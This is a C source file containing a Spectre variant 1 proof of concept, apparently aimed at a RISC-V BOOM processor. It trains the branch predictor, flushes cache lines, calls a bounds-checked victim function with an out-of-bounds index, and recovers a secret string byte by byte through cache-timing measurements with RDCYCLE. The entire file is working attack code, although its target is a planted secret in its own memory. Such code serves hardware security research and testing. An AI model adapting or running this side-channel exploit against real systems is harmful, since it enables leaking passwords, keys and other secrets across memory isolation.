#include <stdio.h>
#include <stdint.h>

#include "cache.h"
#include "riscv-util.h"
//#include "log.h"

#define PAGE_SZ 512
#define TRAIN_TIMES 5 // assumption is that you have a 2 bit counter in the predictor
#define SECRET_SZ 33

uint8_t array1_sz = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretString = "The Baby BOOMers are called Jabba";
uint8_t dummy = 0;

uint64_t results[256];
uint8_t minIdx(uint64_t* results, uint64_t sz){
    uint64_t minVal = ~0;
    uint64_t minIdxVal = 0;
    for (uint64_t i = 0; i < sz; ++i){
        if (minVal > results[i]){
            minVal = results[i];
            minIdxVal = i;
        }
    }
    return minIdxVal;
}

void victimFunc(uint64_t idx){
    if (idx < array1_sz){
        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }
}

int main(void){
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint8_t len = 0;
    //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, attackIdx);

    // try to read out the secret
    for(uint8_t len = 0; len < SECRET_SZ; ++len){
        // make sure array you read from is not in the cache
        flushCache((uint64_t)array2, sizeof(array2));
        
        // train the BP to predict that the if will go through
        for(uint8_t trainIdx = 0; trainIdx < TRAIN_TIMES; ++trainIdx){
            // make sure the array1_sz is out of the cache
            flushCache((uint64_t)&array1_sz, 1);
            // call function to train BP
            victimFunc(0);
        }

        // make sure the array1_sz is out of the cache
        flushCache((uint64_t)&array1_sz, 1);
        // call the function with bad values to bring the secret into the cache
        victimFunc(attackIdx);

        // read out array 2 and see the hit secret value
        // this is also assuming there is no prefetching
        for (uint16_t i = 0; i < 256; ++i){
            uint64_t start = RDCYCLE;
            dummy &= array2[i * L1_BLOCK_SZ_BYTES];
            uint64_t end = RDCYCLE;
        
            //printf("time for idx(%d) = (%d)\n", i, end - start);
            results[i] = end - start;
        }
        
        // Note: Could do this using a threshold value for a hit
        uint8_t secret = minIdx(results, 256);

        printf("m[0x%p] = decimal(%d) char(%c)\n", (uint8_t*)(array1 + attackIdx), secret, secret); 

        // read in the next secret 
        ++attackIdx;
    }

    return 0;
}
